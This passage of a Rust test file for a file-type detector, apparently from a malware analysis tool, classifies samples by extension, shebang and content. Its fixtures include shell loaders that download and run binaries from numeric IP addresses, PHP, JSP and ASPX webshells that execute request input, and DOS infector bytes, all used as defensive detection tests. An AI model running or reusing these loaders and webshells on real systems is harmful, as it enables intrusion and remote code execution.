//! Source and script languages: by extension, by shebang, and by content.

use super::*;

// ── Java ─────────────────────────────────────────────────────────

#[test]
fn java_class_magic() {
    assert_detect(
        "Main.class",
        &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52],
        FileType::JavaClass,
    );
}

/// `.class` and `.dex` are defined by their magic. A name with no magic
/// behind it is not the format; the body decides.
#[test]
fn magic_defined_names_need_their_magic() {
    assert_detect("Foo.class", b"x = 1\n", FileType::Text);
    assert_detect("classes.dex", b"x = 1\n", FileType::Text);
    assert_detect(
        "Exploit.JS.RealPlr.ko",
        b"<html><body><script>var a=1;</script></body></html>\n",
        FileType::Html,
    );
}

#[test]
fn java_source_by_ext() {
    assert_ext("Foo.java", FileType::Java);
}

#[test]
fn jar_pk_magic() {
    assert_detect("lib.jar", b"PK\x03\x04jar content", FileType::Jar);
}

#[test]
fn jar_by_ext() {
    assert_detect("lib.war", b"PK\x03\x04war content", FileType::Jar);
}

#[test]
fn xpi_by_ext_routes_to_xpi_not_zip() {
    // ZIP magic + .xpi extension → FileType::Xpi (distinct from generic Zip).
    assert_detect("addon.xpi", b"PK\x03\x04xpi content", FileType::Xpi);
}

#[test]
fn xpi_classified_as_archive() {
    assert!(FileType::Xpi.is_archive());
}

#[test]
fn whl_by_ext_routes_to_whl_not_zip() {
    assert_detect(
        "pkg-1.0-py3-none-any.whl",
        b"PK\x03\x04wheel content",
        FileType::Whl,
    );
}

#[test]
fn whl_classified_as_archive() {
    assert!(FileType::Whl.is_archive());
}

#[test]
fn opc_package_archives_do_not_route_to_ooxml() {
    let data = b"PK\x03\x04[Content_Types].xml";
    for name in [
        "app.msix",
        "app.appx",
        "bundle.msixbundle",
        "bundle.appxbundle",
        "comic.cbz",
    ] {
        assert_detect(name, data, FileType::Zip);
    }
}

// ── Python ───────────────────────────────────────────────────────

#[test]
fn python_by_ext() {
    assert_ext("script.py", FileType::Python);
}

#[test]
fn python_by_shebang() {
    assert_detect(
        "mystery",
        b"#!/usr/bin/env python3\nimport sys\n",
        FileType::Python,
    );
}

#[test]
fn python_by_import_heuristic_without_filename() {
    assert_detect(
        "mystery",
        b"import os, subprocess, tempfile, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n",
        FileType::Python,
    );
}

#[test]
fn python_bytecode_magic() {
    assert_detect(
        "mod.pyc",
        &[0x42, 0x0D, 0x0D, 0x0A, 0, 0, 0, 0],
        FileType::PythonBytecode,
    );
}

#[test]
fn python_bytecode_by_ext() {
    assert_ext("mod.pyc", FileType::PythonBytecode);
}

// ── JavaScript / TypeScript ──────────────────────────────────────

#[test]
fn javascript_by_ext() {
    assert_ext("app.js", FileType::JavaScript);
    assert_ext("app.mjs", FileType::JavaScript);
    assert_ext("app.cjs", FileType::JavaScript);
    assert_ext("app.jsx", FileType::JavaScript);
}

#[test]
fn javascript_by_shebang() {
    assert_detect(
        "tool",
        b"#!/usr/bin/env node\nconsole.log('hi');\n",
        FileType::JavaScript,
    );
}

#[test]
fn javascript_runtime_shebang_on_typescript_stays_typescript() {
    for shebang in [
        "#!/usr/bin/env node",
        "#!/usr/bin/env -S deno run",
        "#!/usr/bin/env bun",
    ] {
        let data = format!("{shebang}\nconst x: number = 1;\n");
        let det = detect(Path::new("cli.ts"), data.as_bytes()).unwrap();
        assert_eq!(det.file_type, FileType::TypeScript, "{shebang}");
        assert_eq!(det.source, DetectionSource::Shebang, "{shebang}");
        assert!(!det.extension_mismatch(), "{shebang}");
    }
    // Without the extension, the runtime is all there is to go on.
    assert_detect(
        "cli",
        b"#!/usr/bin/env node\nconst x = 1;\n",
        FileType::JavaScript,
    );
}

#[test]
fn typescript_by_ext() {
    assert_ext("app.ts", FileType::TypeScript);
    assert_ext("app.tsx", FileType::TypeScript);
}

// ── Shell ────────────────────────────────────────────────────────

#[test]
fn shell_by_ext() {
    assert_ext("run.sh", FileType::Shell);
    assert_ext("run.bash", FileType::Shell);
    assert_ext("run.zsh", FileType::Shell);
}

#[test]
fn shell_by_shebang() {
    assert_detect("mystery", b"#!/bin/bash\necho hello\n", FileType::Shell);
    assert_detect("mystery", b"#!/bin/sh\necho hello\n", FileType::Shell);
    assert_detect(
        "mystery",
        b"#!/usr/bin/env zsh\necho hello\n",
        FileType::Shell,
    );
}

#[test]
fn script_extension_overrides_shell_shebang_juke() {
    // .py with a bash shebang: the shebang is a static-analysis-evasion
    // juke, the extension is what the user/loader treats the file as.
    // Trust the extension; flag the mismatch.
    let det = detect(Path::new("script.py"), b"#!/bin/bash\necho hello\n").unwrap();
    assert_eq!(det.file_type, FileType::Python);
    assert!(det.extension_mismatch());
    assert_eq!(det.extension_type(), Some(FileType::Python));
    assert_eq!(det.shebang_type(), Some(FileType::Shell));
}

#[test]
fn js_extension_overrides_bash_shebang_juke() {
    // npm xmlrpc / xmrdropper pattern.
    let det = detect(
        Path::new("validator.js"),
        b"#!/bin/bash\nconst fs = require('fs');\n",
    )
    .unwrap();
    assert_eq!(det.file_type, FileType::JavaScript);
    assert!(det.extension_mismatch());
    assert_eq!(det.extension_type(), Some(FileType::JavaScript));
    assert_eq!(det.shebang_type(), Some(FileType::Shell));
}

#[test]
fn shebang_juke_reports_the_extension_type() {
    // `mismatch_ext_type` names what the extension implied, as for every other
    // mismatch; the shebang's claim is not the extension's.
    let id = FileId::from_path_and_bytes(
        Path::new("juke.js"),
        b"#!/bin/bash
echo hi
",
    );
    assert_eq!(id.file_type(), FileType::JavaScript);
    assert_eq!(id.source(), DetectionSource::ExtensionOverridesShebang);
    assert!(id.extension_mismatch());
    let json = serde_json::to_value(id).unwrap();
    assert_eq!(json["extension_mismatch"], true);
    assert_eq!(json["mismatch_ext_type"], "javascript");
}

#[test]
fn padded_batch_line_does_not_grow_the_stack() {
    // A grammar that recursed once per leading `(` would overflow even a
    // main-thread stack on a megabyte of them, an abort no `catch_unwind`
    // can stop.
    let data = vec![b'('; 1 << 20];
    let id = std::thread::Builder::new()
        .stack_size(256 * 1024)
        .spawn(move || FileId::from_path_and_bytes(Path::new("pb"), &data))
        .unwrap()
        .join()
        .unwrap();
    assert_ne!(id.source(), DetectionSource::Failed);
}

#[test]
fn protobuf_schema_extension_prevents_kotlin_heuristic() {
    let data = br#"syntax = "proto3";

package c2;

service C2Service {
  rpc BeaconStream(stream BeaconMessage) returns (stream CommandMessage);
  rpc SendCommand(SendCommandRequest) returns (SendCommandResponse);
}

message CommandMessage {
  string command_id = 1;
  string command = 2;
  repeated string args = 3;
}
"#;
    let det = detect(Path::new("c2.proto"), data).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert!(!det.extension_mismatch());
}

#[test]
fn shell_extension_with_shell_shebang_no_juke() {
    // .sh with bash shebang: not a juke, no override.
    let det = detect(Path::new("script.sh"), b"#!/bin/bash\necho hello\n").unwrap();
    assert_eq!(det.file_type, FileType::Shell);
    assert!(!det.extension_mismatch());
}

#[test]
fn shell_one_liner_without_shebang_or_ext() {
    assert_detect(
        "Sifuvuziw",
        b"cd $TMPDIR && curl -O http://144.31.236.51/Dynamic && xattr -c ./Dynamic && chmod +x ./Dynamic && ./Dynamic\n",
        FileType::Shell,
    );
}

#[test]
fn shell_multarch_wget_loader_without_shebang_or_ext() {
    let data = b"cd /tmp || /var/tmp; rm avtech.arm5; wget http://193.243.147.115/avtech.arm5; chmod 777 avtech.arm5; ./avtech.arm5\n\
cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; chmod 777 avtech.arm7; ./avtech.arm7\n";
    assert_detect("avTECH", data, FileType::Shell);
}

#[test]
fn shell_empty_falls_back_to_ext() {
    let det = detect(Path::new("run.sh"), b"").unwrap();
    assert_eq!(det.file_type, FileType::Shell);
    assert_eq!(det.source, DetectionSource::Extension);
}

// ── Batch ────────────────────────────────────────────────────────

#[test]
fn batch_by_ext() {
    assert_ext("run.bat", FileType::Batch);
    assert_ext("run.cmd", FileType::Batch);
}

// ── JCL ──────────────────────────────────────────────────────────

#[test]
fn jcl_by_ext() {
    assert_ext("run.jcl", FileType::Jcl);
}

// ── VBScript ─────────────────────────────────────────────────────

#[test]
fn vbs_by_ext() {
    assert_ext("script.vbs", FileType::Vbs);
    assert_ext("script.vbe", FileType::Vbs);
    assert_ext("script.wsf", FileType::Vbs);
}

// ── Go / Rust / Swift / Objective-C / Zig / Elixir ──────────────

#[test]
fn go_by_ext() {
    assert_ext("main.go", FileType::Go);
}

#[test]
fn rust_by_ext() {
    assert_ext("lib.rs", FileType::Rust);
}

#[test]
fn swift_by_ext() {
    assert_ext("app.swift", FileType::Swift);
}

#[test]
fn objc_by_ext() {
    // Plain C is Objective-C too; with no directive to score, C statement
    // structure keeps the name.
    let c = b"extern void GoFunc();\nint main(int argc, char **argv) {\n\tGoFunc();\n}\n";
    assert_detect("view.m", c, FileType::ObjectiveC);
    assert_detect("view.mm", c, FileType::ObjectiveC);
}

/// A `.m` of many `#include` lines scores heavily for C, and a couple of
/// directives still make it Objective-C.
#[test]
fn objc_directives_beat_c_includes() {
    let mut src = b"#include <stdio.h>\n".repeat(12);
    src.extend_from_slice(b"#import <Foundation/Foundation.h>\n@interface Foo : NSObject\n@end\n");
    assert_detect("Foo.mm", &src, FileType::ObjectiveC);
}

/// Text with neither a directive nor C structure is not Objective-C
/// because of its last letter: a MATLAB script, a hosts file.
#[test]
fn m_without_objc_or_c_structure_is_text() {
    assert_detect(
        "genherm.m",
        b"% Hermite points\nx = linspace(0, 1, 10)\ndisp(x)\n",
        FileType::Text,
    );
    assert_detect(
        "Trojan.Win32.Qhost.m",
        b"127.0.0.1 ruworld.com\r\n127.0.0.1 example.net\r\n",
        FileType::Text,
    );
}

/// A batch file under a Perl test name. Perl's `.t` has nothing to say
/// against `@echo off` when the body carries no Perl at all.
#[test]
fn batch_body_contradicts_perl_extension() {
    assert_detect(
        "Trojan.BAT.Looper.t",
        b"@echo off\r\n:loop\r\ngoto loop\r\n",
        FileType::Batch,
    );
    assert_detect(
        "Virus.BAT.Silly.m",
        b"if \"%1==\" for %%i in (*.b*) do call %0 %%i\r\n",
        FileType::Batch,
    );
}

/// `start WScript.exe x.vbs` is a batch line launching the host.
#[test]
fn wscript_exe_is_not_vbscript() {
    let bat = b"@echo off\r\nif exist sys32.vbs start WScript.exe sys32.vbs&exit\r\nif exist a.vbs start WScript.exe a.vbs&exit\r\n";
    assert_detect("Worm.VBS.Autorun.m", bat, FileType::Batch);
}

/// mIRC handlers at any level and for any event, and mIRC's saved-script INI.
#[test]
fn mirc_event_headers_and_saved_script() {
    assert_detect(
        "Backdoor.IRC.Cloner.m",
        b"on 10:TEXT:*:*:{\n  if ($1 == !quit) { /quit }\n}\n",
        FileType::Mirc,
    );
    assert_detect(
        "Backdoor.IRC.CWSBD",
        b"on *:start: {\n  socklisten door 37173\n}\n",
        FileType::Mirc,
    );
    assert_detect(
        "IRC-Worm.IRC.TooLame.a",
        b"[script]\r\nn0=on 1:LOAD: { .ial on }\r\nn1=on 1:UNLOAD: { .quit }\r\n",
        FileType::Mirc,
    );
    // A VBScript that writes a mIRC script quotes the header mid-line.
    assert_detect(
        "Email-Worm.VBS.LoveLetter.bb",
        b"On Error Resume Next\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nscriptini.WriteLine \"n0=on 1:JOIN:#:{\"\nWScript.Echo 1\n",
        FileType::Vbs,
    );
}

/// An alias file written with mIRC identifiers is mIRC even when it
/// writes batch lines into the file it drops.
#[test]
fn mirc_alias_file_is_mirc_not_batch() {
    let src = b"alias xspread {\r\n  .write x-.bat net view > x-.txt\r\n  .write x-.bat @echo off\r\n  .timersx 1 20 xcopy1\r\n}\r\nalias xcopy1 {\r\n  if ($lines(x-.txt) < 6) { halt }\r\n}\r\n";
    assert_detect("Trojan.IRC.Nullpy.a", src, FileType::Mirc);
    // ircII shares the brace form, but not mIRC's identifiers.
    assert_ne!(
        detect(Path::new("x.irc"), b"alias hi {\n  echo hello\n}\n").map(|d| d.file_type),
        Some(FileType::Mirc)
    );
}

/// A 27-byte COM infector is too short for the percentage alone, and a
/// zero-filled header is NUL in both lanes -- not UTF-16 text.
#[test]
fn short_and_nul_padded_binaries_are_not_source() {
    let com = [
        0xb4, 0x4e, 0xba, 0x10, 0x01, 0xcd, 0x21, 0xb4, 0x3c, 0xba, 0x9e, 0x00, 0xcd, 0x21, 0xb2,
        0x1b, 0x2a, 0x2e, 0x43, 0x4f, 0x4d, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf1,
    ];
    assert_detect("Virus.DOS.Trivial.27.m", &com, FileType::DosCom);
    let mut jet = vec![0x00u8, 0x01, 0x00, 0x00];
    jet.extend_from_slice(b"Standard Jet DB\0");
    jet.resize(2048, 0);
    assert_detect("Virus.MSAccess.Poison.c", &jet, FileType::Data);
}

#[test]
fn markdown_named_javascript_is_javascript() {
    let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2,_0x20e97b){\n\
const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
function loadBytenode(){return require('bytenode');}\n})();\n";
    assert_detect("CHANGELOG.md", js, FileType::JavaScript);
    let readme = b"# Notes\n\nInstall with `npm install foo`.\n\nSee the docs.\n";
    assert_detect("README.md", readme, FileType::Markdown);
}

#[test]
fn txt_php_webshell_overrides_text_extension() {
    let php = b"<?\n$cmd = stripslashes($cmd);\nsystem($cmd);\n";
    assert_detect("Php_Backdoor.txt", php, FileType::Php);
    // A saved webshell that also embeds `document.write` must not tie
    // JavaScript inside the sniff window. Stored compressed so endpoint
    // protection leaves the checkout intact.
    let saved = zstd::decode_all(&include_bytes!("../testdata/php-backdoor.txt.zst")[..])
        .expect("fixture decompresses");
    assert_detect("Php_Backdoor.txt", &saved, FileType::Php);
}

#[test]
fn jsp_page_directive_is_jsp() {
    let bom = b"\xef\xbb\xbf<%@page pageEncoding=\"utf-8\"%>\n<%@page import=\"java.io.*\"%>\n<%!\nString pw = \"x\";\n%>\n";
    assert_detect("date.jsp.txt", bom, FileType::Jsp);
    let spaced = b"<%@ page language=\"java\" contentType=\"text/html\"%>\n<% out.println(1); %>\n";
    assert_detect("page.jsp", spaced, FileType::Jsp);
    // An HTML prologue does not change what a `.jsp` is.
    assert_detect("page.jsp", b"<html><body>hi</body></html>", FileType::Jsp);
    // A Java source file that quotes a directive stays Java.
    assert_detect(
        "App.java",
        b"<%@page pageEncoding=\"utf-8\"%>\nclass App {}\n",
        FileType::Java,
    );
    // A saved browser copy opens with a doctype. The page directive a few
    // lines later is still the type.
    let saved = b"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n\
<HTML><HEAD><TITLE>shell</TITLE></HEAD>\n\
<%@ page contentType=\"text/html; charset=GBK\" %>\n\
<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n";
    assert_detect("shell.jsp.txt", saved, FileType::Jsp);
    assert_detect(
        "base64.jspx.txt",
        b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n\
<jsp:scriptlet>String s;</jsp:scriptlet>\n</jsp:root>\n",
        FileType::Jsp,
    );
    assert_detect(
        "App.java",
        b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\">\nclass App {}\n",
        FileType::Java,
    );
    assert_detect(
        "page.html",
        b"<!DOCTYPE html>\n<html><body>hi</body></html>\n",
        FileType::Html,
    );
}

#[test]
fn asp_directive_is_asp() {
    let classic = b"<%@ Language=VBScript %>\n<%\nFunction Foo()\nEnd Function\n%>\n";
    assert_detect("aspydrv.asp.txt", classic, FileType::Asp);
    let aspx = b"<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\n</script>\n";
    assert_detect("shell.aspx", aspx, FileType::Asp);
    assert_detect("renamed.txt", aspx, FileType::Asp);
    let jscript_aspx = b"<%@Page Language=\"Jscript\"%>\n<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item['x'])));%>\n";
    assert_detect("shell.aspx", jscript_aspx, FileType::Asp);
    assert_detect("payload.unknown", jscript_aspx, FileType::Asp);
}

#[test]
fn ace_jsp_snippets_are_javascript_not_jsp() {
    let snippets = b"define(\"ace/snippets/jsp\",[\"require\",\"exports\",\"module\"],function(require,exports,module){\nexports.snippetText = \"<%@page contentType=\\\"text/html\\\"%>\\n\";\n});\n";
    assert_detect("jsp.js", snippets, FileType::JavaScript);
    // Without a name, a directive quoted inside a string literal is still no
    // page directive.
    assert_ne!(
        detect(Path::new("snippet.unknown"), snippets).map(|d| d.file_type),
        Some(FileType::Jsp)
    );
}

#[test]
fn coldfusion_tex_yara_postscript_and_irc_scripts() {
    assert_detect("p.cfm", b"<cfset x = 1>\n", FileType::Cfml);
    assert_detect("p.txt", b"<cfoutput>#x#</cfoutput>\n", FileType::Cfml);
    assert_detect("a.tex", b"hello\n", FileType::Tex);
    assert_detect("notes.txt", b"\\documentclass{article}\n", FileType::Tex);
    // `.cls` is also Visual Basic. The body decides.
    assert_detect("article.cls", b"\\ProvidesClass{article}\n", FileType::Tex);
    let vb_cls = detect(Path::new("Module.cls"), b"VERSION 1.0 CLASS\n");
    assert_ne!(vb_cls.map(|d| d.file_type), Some(FileType::Tex));
    let yara = b"rule Demo {\nstrings:\n$a = \"x\"\ncondition:\ntrue\n}\n";
    assert_detect("r.yar", yara, FileType::Yara);
    assert_detect("rules.txt", yara, FileType::Yara);
    assert_detect("doc.ps", b"%!PS-Adobe-3.0\n", FileType::PostScript);
    assert_detect("bare.ps", b"not a header\n", FileType::PostScript);
    assert_detect("bot.mrc", b"alias x echo hi\n", FileType::Mirc);
    assert_detect("shell.m", b"on *:TEXT:*:echo hi\n", FileType::Mirc);
    assert_detect("shell.lua", b"ON 1:JOIN:*:{\n}\n", FileType::Mirc);
    assert_detect("hooks.ircii", b"alias x echo hi\n", FileType::IrcII);
    assert_detect("rc.txt", b"^on ^join \"*\" {\n}\n", FileType::IrcII);
}

#[test]
fn prose_txt_stays_text() {
    let note = b"This is a note about the meeting. We should let the team decide next week.\n";
    assert_detect("notes.txt", note, FileType::Text);
    let license = b"Modified Version, except to acknowledge the contribution.\n\
Original or Modified Versions may be sold by itself.\n";
    assert_detect("OFL.txt", license, FileType::Text);
    let guide = b"If you discover a problem, post a message and let the rest of us know.\n\
Coordinate with the Applet Maintainer before sweeping changes.\n";
    assert_detect("contributing.txt", guide, FileType::Text);
}

#[test]
fn php4_agent_without_known_extension_is_php() {
    let php = b"<?\nclass backdoor {\n  var $pwd;\n  var $shell;\n  function shell() {\n    echo $_SERVER['PHP_SELF'];\n  }\n}\n";
    assert_detect("Backdoor.PHP.Agent.ap", php, FileType::Php);
}

#[test]
fn php_webshell_with_bb_extension_is_php() {
    let php = b"<?\n@$output = system($_POST['command']);\n";
    assert_detect("Backdoor.PHP.Agent.bb", php, FileType::Php);
}

#[test]
fn babashka_script_keeps_bb_extension() {
    let bb = b"(defn main []\n  (println \"hi\"))\n";
    assert_detect("script.bb", bb, FileType::Clojure);
}

#[test]
fn perl_source_with_m_extension_is_perl() {
    let perl = b"use strict;\nmy $port = 6667;\nprint $sock \"NICK $nick\\r\\n\";\n";
    assert_detect("Scanner.m", perl, FileType::Perl);
}

#[test]
fn objective_c_source_keeps_m_extension() {
    let objc =
        b"#import <Foundation/Foundation.h>\n@interface View : NSObject\n- (void)draw;\n@end\n";
    assert_detect("View.m", objc, FileType::ObjectiveC);
}

#[test]
fn dos_com_with_source_extension_is_data() {
    let mut com = vec![0x90u8; 80];
    for i in (0..80).step_by(8) {
        com[i] = 0x01;
    }
    com[10..14].copy_from_slice(&[0xB4, 0x4C, 0xCD, 0x21]);
    assert_detect("Burger.m", &com, FileType::DosCom);
    assert_detect("Trivial.45.t", &com, FileType::DosCom);
    assert_detect("prog.com", &com, FileType::DosCom);
    assert_detect("prog.com", b"MZ\x90\x00", FileType::Pe);
}

/// Content-addressed stores name files by hash or give them a generic data
/// suffix, so a COM program there has no `.com` to go on.
#[test]
fn dos_com_without_a_telling_name_is_dos_com() {
    let mut com = vec![0x90u8; 80];
    for i in (0..80).step_by(8) {
        com[i] = 0x01;
    }
    com[10..14].copy_from_slice(&[0xB4, 0x4C, 0xCD, 0x21]);
    assert_detect(
        "0f3a9c1e2b7d4f6a8e5c3b1a9d7f5e3c1b9a7d5f3e1c9b7a5d3f1e9c7b5a3d1f",
        &com,
        FileType::DosCom,
    );
    assert_detect("prog", &com, FileType::DosCom);
    assert_detect("prog.bin", &com, FileType::DosCom);
}

#[test]
fn padded_anton_overwriter_is_recovered_as_dos_com() {
    let anton =
        &crate::fileid::testutil::unzstd(include_bytes!("../../../testdata/dos-com/anton-97.zst"));
    let detection = detect(Path::new("Virus.DOS.Trivial.Anton.97"), anton)
        .expect("DOS overwriter execution shape should identify the opaque sample");
    assert_eq!(detection.file_type, FileType::DosCom);
    assert_eq!(detection.source, DetectionSource::Heuristic);
    assert_eq!(detection.ext_match, ExtensionMatch::Consistent);

    // A lone interrupt and a COM-like string are too weak without the
    // repeated DOS-call and termination shape.
    let mut ordinary_data = vec![0u8; 5120];
    ordinary_data[..6].copy_from_slice(b"*.COM\0");
    ordinary_data[16..18].copy_from_slice(&[0xCD, 0x21]);
    ordinary_data[32..34].copy_from_slice(&[0xCD, 0x20]);
    assert!(
        detect(Path::new("opaque.97"), &ordinary_data)
            .is_none_or(|d| d.file_type != FileType::DosCom)
    );
}

/// Opaque bytes after a call/pop GetPC stub: the shape of a carved,
/// encoded stage. Unknown before, so no rule could reach it.
fn call_pop_blob() -> Vec<u8> {
    let mut state = 0x2545_F491u32;
    let mut blob: Vec<u8> = (0..512)
        .map(|_| {
            state = state.wrapping_mul(1_103_515_245).wrapping_add(12_345);
            (state >> 24) as u8
        })
        .collect();
    blob[..5].copy_from_slice(&[0xE8, 0xFB, 0x01, 0, 0]); // call → 0x200
    blob.resize(0x210, 0);
    blob[0x200] = 0x5A; // pop edx
    blob
}

#[test]
fn headerless_shellcode_is_shellcode() {
    let sc = call_pop_blob();
    for name in [
        "agent.bin.sgn",
        "prog",
        "stage.bin",
        "payload.dat",
        "a.exe",
        "x.c",
    ] {
        assert_detect(name, &sc, FileType::Shellcode);
    }
    assert_eq!(FileId::from_bytes(&sc).file_type(), FileType::Shellcode);
    assert_eq!(FileType::from_label("shellcode"), Some(FileType::Shellcode));
    assert!(FileType::Shellcode.is_binary());
}

#[test]
fn known_formats_beat_shellcode() {
    let mut pe = call_pop_blob();
    pe[..2].copy_from_slice(b"MZ");
    assert_ne!(
        detect(Path::new("a.bin"), &pe).map(|d| d.file_type),
        Some(FileType::Shellcode)
    );
    // Without the stub's pop, it stays what it was.
    let mut data = call_pop_blob();
    data[0x200] = 0x90;
    assert!(detect(Path::new("blob"), &data).is_none_or(|d| d.file_type != FileType::Shellcode));
}

#[test]
fn kotlin_native_metadata_with_incidental_int21_is_data() {
    let mut knf = vec![0u8; 0x520];
    knf[..4].copy_from_slice(&[0x00, 0x00, 0x00, 0x01]);
    knf[0x500..0x507].copy_from_slice(&[0x26, 0xE7, 0x26, 0xF4, 0x26, 0xCD, 0x21]);
    assert!(
        detect(Path::new("45_js.knf"), &knf)
            .is_none_or(|detection| detection.file_type != FileType::DosCom),
        "Kotlin/Native metadata must not be classified as DOS COM"
    );
}

/// A PE under a repeating XOR key is opaque data, not Unknown: that is
/// what routes it to the generic analyzer and the `xor.*` facts.
#[test]
fn xor_encoded_pe_is_data() {
    let pe = include_bytes!("../../../tests/fixtures/test.exe");
    let key = [0x55, 0x64, 0xee, 0x58, 0x6f, 0x83, 0xb8, 0x02];
    let enc: Vec<u8> = pe
        .iter()
        .zip(key.iter().cycle())
        .map(|(b, k)| b ^ k)
        .collect();
    // `.bin` is Data by name; the others reach Data only through the key.
    for name in ["hvnc.enc", "payload", "payload.bin"] {
        let det = detect(Path::new(name), &enc).expect("detected");
        assert_eq!(det.file_type, FileType::Data, "{name}");
        assert!(!det.extension_mismatch(), "{name}");
        let id = FileId::from_path_and_bytes(Path::new(name), &enc);
        assert_eq!(
            id.xor_pe_key().map(|k| k.bytes().to_vec()),
            Some(key.to_vec())
        );
    }
    // The plaintext image is still a PE by its magic, and carries no key.
    assert_detect("hvnc.enc", pe, FileType::Pe);
    assert!(
        FileId::from_path_and_bytes(Path::new("a.exe"), pe)
            .xor_pe_key()
            .is_none()
    );
}

/// A short NOP prefix before an XOR-encoded PE still exposes the image
/// through the normal FileId recovery path.
#[test]
fn prefixed_xor_encoded_pe_is_data_and_keeps_image_offset() {
    let pe = include_bytes!("../../../tests/fixtures/test.exe");
    let mut plain = vec![0x90; 8];
    plain.extend_from_slice(pe);
    let enc: Vec<u8> = plain.iter().map(|b| b ^ 0x23).collect();
    let id = FileId::from_path_and_bytes(Path::new("payload"), &enc);
    assert_eq!(id.file_type(), FileType::Data);
    let key = id.xor_pe_key().expect("recover prefixed XOR PE");
    assert_eq!(key.bytes(), &[0x23]);
    assert_eq!(key.pe_offset(), 8);
    assert_eq!(key.decode(&enc), plain);
}

/// Size alone is not enough: a small binary with no `INT 21h` near the
/// front stays what it was, so an arbitrary short blob is not a program.
#[test]
fn small_binary_without_int21_is_not_dos_com() {
    let mut blob = vec![0x90u8; 80];
    for i in (0..80).step_by(8) {
        blob[i] = 0x01;
    }
    assert_detect("prog.bin", &blob, FileType::Data);
    let det = detect(Path::new("prog"), &blob);
    assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
}

/// The same bytes past the 64 KiB COM limit are not a COM program: that is
/// how a ciphertext or firmware blob with a chance `CD 21` stays data.
#[test]
fn oversized_blob_with_int21_is_not_dos_com() {
    let mut blob = vec![0x01u8; dos::DOS_COM_MAX_SIZE + 1];
    blob[11] = 0xCD;
    blob[12] = 0x21;
    assert_detect("prog.bin", &blob, FileType::Data);
    let det = detect(Path::new("prog"), &blob);
    assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
}

#[test]
fn nostardamus_self_modifying_xor_entry_is_dos_com() {
    let sample = &crate::fileid::testutil::unzstd(include_bytes!(
        "../../../testdata/dos-com/nostardamus-1870.zst"
    ));
    assert_detect("nostardamus", sample, FileType::DosCom);
}

#[test]
fn utf16_source_with_m_extension_stays_objective_c() {
    let mut utf16 = vec![0xFFu8, 0xFE];
    for b in b"// objc comment\n".repeat(8) {
        utf16.push(b);
        utf16.push(0);
    }
    assert_detect("View.m", &utf16, FileType::ObjectiveC);
}

#[test]
fn zig_by_ext() {
    assert_ext("main.zig", FileType::Zig);
}

#[test]
fn elixir_by_ext() {
    assert_ext("app.ex", FileType::Elixir);
    assert_ext("test.exs", FileType::Elixir);
}

// ── Ruby ─────────────────────────────────────────────────────────

#[test]
fn ruby_by_ext() {
    assert_ext("app.rb", FileType::Ruby);
}

#[test]
fn ruby_by_shebang() {
    assert_detect("tool", b"#!/usr/bin/env ruby\nputs 'hi'\n", FileType::Ruby);
}

// ── PHP ──────────────────────────────────────────────────────────

#[test]
fn php_by_ext() {
    assert_ext("page.php", FileType::Php);
}

#[test]
fn php_by_opening_tag() {
    assert_detect("page", b"<?php\necho 'hello';\n", FileType::Php);
}

#[test]
fn php_by_shebang() {
    assert_detect(
        "tool",
        b"#!/usr/bin/env php\n<?php echo 1;\n",
        FileType::Php,
    );
}

// ── Perl ─────────────────────────────────────────────────────────

#[test]
fn perl_by_ext() {
    assert_ext("script.pl", FileType::Perl);
    assert_ext("module.pm", FileType::Perl);
}

#[test]
fn cpan_makefile_pl_is_perl() {
    for name in ["Makefile.PL", "makefile.pl", "MAKEFILE.PL", "Build.PL"] {
        assert_ext(name, FileType::Perl);
        assert_detect(
            &format!("distribution/{name}"),
            b"use ExtUtils::MakeMaker;\nWriteMakefile(NAME => 'Example');\n",
            FileType::Perl,
        );
    }
    for name in ["Makefile", "Makefile.debug", "Makefile.in", "GNUmakefile"] {
        assert_detect(name, b"all:\n\techo hi\n", FileType::Makefile);
    }
}

#[test]
fn perl_by_shebang() {
    assert_detect("tool", b"#!/usr/bin/perl\nuse strict;\n", FileType::Perl);
}

// ── Lua ──────────────────────────────────────────────────────────

#[test]
fn lua_by_ext() {
    assert_ext("script.lua", FileType::Lua);
}

#[test]
fn lua_by_shebang() {
    assert_detect("tool", b"#!/usr/bin/env lua\nprint('hi')\n", FileType::Lua);
}

// ── C# ───────────────────────────────────────────────────────────

#[test]
fn csharp_by_ext() {
    assert_ext("App.cs", FileType::CSharp);
}

// ── PowerShell ───────────────────────────────────────────────────

#[test]
fn powershell_by_ext() {
    assert_ext("script.ps1", FileType::PowerShell);
    assert_ext("module.psm1", FileType::PowerShell);
}

// An unmapped extension (`.posh`) and no extension at all both leave the
// decision to content; an advanced function with `Add-Type` is PowerShell.
#[test]
fn powershell_by_content_under_unknown_or_missing_extension() {
    let data = b"Add-Type -AssemblyName PresentationCore\r\n\
            function dischat {\r\n  [CmdletBinding()]\r\n  param ([string]$con)\r\n\
            Invoke-RestMethod -Uri $u -Method 'post' -Body @{ 'username' = $env:username }\r\n}\r\n";
    assert_detect("Nz97PyJr.posh", data, FileType::PowerShell);
    assert_detect("Nz97PyJr", data, FileType::PowerShell);
}

// ── Groovy / Scala ───────────────────────────────────────────────

#[test]
fn groovy_by_ext() {
    assert_ext("build.groovy", FileType::Groovy);
    assert_ext("build.gradle", FileType::Groovy);
}

#[test]
fn scala_by_ext() {
    assert_ext("App.scala", FileType::Scala);
}

#[test]
fn sc_markup_is_html_and_scala_script_stays_scala() {
    // A variant letter after a dotted family name is no Scala claim.
    assert_detect(
        "Trojan.HTML.Agent.sc",
        b" <script>function x(){return 1}</script>\n",
        FileType::Html,
    );
    assert_detect(
        "worksheet.sc",
        b"import scala.util._\nprintln(1)\n",
        FileType::Scala,
    );
    assert_detect(
        "App.scala",
